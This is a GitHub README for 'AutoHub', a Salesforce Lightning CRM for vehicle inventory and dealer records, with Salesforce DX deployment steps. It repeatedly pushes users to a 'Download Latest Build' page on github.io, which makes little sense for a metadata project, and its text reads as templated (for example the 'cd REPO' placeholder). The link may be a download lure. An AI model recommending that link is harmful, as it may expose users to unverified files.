# AutoHub - CRM Application 2026

> **AutoHub is a Salesforce Lightning CRM solution that helps teams manage vehicle stock and dealer records using Lightning Web Components, Apex, SOQL, and custom Salesforce objects.**

[![Platform](https://img.shields.io/badge/Platform-Salesforce%20Lightning%20Platform-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Not%20specified-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/brandoncooperqy1076/autohub-salesforce-app?style=flat-square)](https://github.com/brandoncooperqy1076/autohub-salesforce-app)

---

<p align="center">
  <a href="https://brandoncooperqy1076.github.io/autohub-salesforce-app/">
    <img src="https://img.shields.io/badge/Download-AutoHub%20Latest-brightgreen?style=for-the-badge" alt="Download AutoHub">
  </a>
</p>

> **[Download AutoHub](https://brandoncooperqy1076.github.io/autohub-salesforce-app/)**

---

[Download Latest Build](https://brandoncooperqy1076.github.io/autohub-salesforce-app/)

---

## Overview

AutoHub gives Salesforce teams a focused workspace for handling vehicle inventory and dealer information. Vehicle and dealer records are connected within Salesforce so users can inspect entries, update details, and move between related records without leaving the platform.

The user interface is built with Lightning Web Components, while Apex, SOQL, and custom objects provide the application logic and data model. Vehicle search, record detail pages, relationship views, and KPI information support day-to-day dealer and inventory operations.

---

## Capabilities

- Create, view, edit, and delete vehicle inventory records.
- Store dealer profiles together with contact details and ratings.
- Associate vehicle records with dealers through lookup relationships.
- Find vehicles through search and open individual detail pages.
- View dealer details and the vehicles connected to each dealer.
- Follow key operational measures in a responsive KPI dashboard.
- Deliver Salesforce-native screens with Lightning Web Components.
- Deploy metadata through Salesforce DX-based processes.

---

## Getting Started

AutoHub is deployed to a Salesforce org through Salesforce DX tooling.

1. Install Salesforce CLI and log in to the Salesforce org that will receive the application.
2. Clone the repository:

   ```bash
   git clone https://github.com/brandoncooperqy1076/autohub-salesforce-app.git
   cd REPO
   ```

3. Inspect the project files and verify the alias for the destination org.
4. Start the metadata deployment:

   ```bash
   sf project deploy start --target-org YOUR_ORG_ALIAS
   ```

5. In Salesforce, place the AutoHub components on the Lightning app or page where they are needed.

Organizations using the older command syntax may be able to perform the corresponding deployment with `sfdx force:source:deploy`.

---

## Working with AutoHub

A normal user flow includes the following steps:

1. Launch AutoHub from Salesforce Lightning.
2. Use the KPI dashboard to get an overview of the available records.
3. Search inventory to locate a vehicle or a set of vehicle records.
4. Open a vehicle page to see its details and linked dealer.
5. Add, modify, or delete vehicle records when required.
6. Visit a dealer record to review its contacts, rating, and associated vehicles.

For development or release work, update the Salesforce DX project, validate the metadata, and deploy the revised source to the chosen org.

---

## Org Configuration

The target Salesforce org supplies the metadata and configuration used by AutoHub. Check these areas before deploying:

- Salesforce org selection and authenticated-user access.
- Custom objects and fields required for vehicle and dealer records.
- Lookup links connecting vehicles with dealers.
- Lightning apps, pages, and component placement.
- Permissions for users responsible for inventory and dealer information.

Salesforce DX project files and the selected org alias control deployment settings. Where suitable, keep settings specific to an individual org out of the shared source.

---

## Requirements

- A Salesforce org that provides access to the Lightning Platform.
- Salesforce CLI with support for Salesforce DX projects.
- Permission to deploy metadata and work with the necessary Salesforce objects.
- Availability of Lightning Web Components and Apex.
- A browser supported by the Salesforce Lightning experience.
- Enough Salesforce org storage for the metadata and vehicle or dealer records.

---

## Frequently Asked Questions

### What teams use AutoHub?

AutoHub is designed for Salesforce users and development teams that manage vehicle inventory and dealer data in a CRM setting.

### How are new changes deployed?

Get the current project files, authenticate to the intended Salesforce org, then run the Salesforce DX deployment command against that org.

### What stores the vehicle and dealer information?

Vehicle and dealer data is held in Salesforce custom objects, with lookup relationships connecting related records.

### Are Lightning pages and dashboard placement configurable?

Yes. Teams can adjust Lightning page placement and related Salesforce settings in the target org, subject to their permissions and organizational needs.

### What can I verify when a deployment does not succeed?

Review the Salesforce CLI installation, login state, org alias, metadata dependencies, and the details reported in the deployment error. Also confirm that the deploying user has the required permissions.

### How do I find newer materials?

Check the repository’s latest project files and the download location linked above for newer builds or deployment materials.

---

## Planned Improvements

- Make vehicle and dealer search flows more capable.
- Broaden dashboard metrics and reporting views.
- Improve Lightning layouts across additional screen sizes.
- Expand support for Salesforce metadata deployment.
- Provide more views centered on inventory and dealer relationships.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
